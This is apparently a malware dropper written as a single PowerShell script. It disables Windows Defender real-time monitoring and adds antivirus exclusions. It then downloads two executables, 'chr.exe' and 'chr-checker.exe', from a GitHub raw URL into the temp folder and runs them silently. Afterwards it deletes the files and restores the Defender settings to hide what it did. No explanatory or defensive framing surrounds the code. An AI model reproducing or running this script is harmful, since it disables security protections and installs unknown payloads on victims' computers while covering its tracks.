$url1 = 'https://raw.githubusercontent.com/noobyoume/mon/main/chr.exe'; $tempPath1 = [System.IO.Path]::Combine($env:TEMP, 'setup1.exe'); $url2 = 'https://raw.githubusercontent.com/noobyoume/mon/main/chr-checker.exe'; $tempPath2 = [System.IO.Path]::Combine($env:TEMP, 'setup2.exe'); try { Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath $tempPath1; Add-MpPreference -ExclusionPath $tempPath2; Invoke-WebRequest -Uri $url1 -OutFile $tempPath1; Start-Process -FilePath $tempPath1 -ArgumentList '/S' -Wait; Invoke-WebRequest -Uri $url2 -OutFile $tempPath2; Start-Process -FilePath $tempPath2 -ArgumentList '/S' -Wait; } finally { if (Test-Path $tempPath1) { Remove-Item $tempPath1 -Force -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionPath $tempPath1 -ErrorAction SilentlyContinue }; if (Test-Path $tempPath2) { Remove-Item $tempPath2 -Force -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionPath $tempPath2 -ErrorAction SilentlyContinue }; Set-MpPreference -DisableRealtimeMonitoring $false }
